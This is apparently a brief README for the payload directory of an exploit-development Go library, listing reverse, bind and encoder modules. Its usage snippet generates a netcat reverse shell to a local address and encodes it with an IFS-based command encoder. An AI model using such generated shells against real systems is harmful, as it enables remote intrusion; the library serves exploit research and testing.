# Payloads

Put common payloads in the `payload` directory.

## Structure

* `reverse.go` for reverse payloads
* `bind.go` for bind payloads
* `encode.go` for encoders

## Usage

```go
package main

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/payload"
)

func main() {
	p := payload.ReverseShellNetcatGaping("127.0.0.1", 4444)

	fmt.Println(p)
	fmt.Println(payload.EncodeCommandIFS(p))
}
```
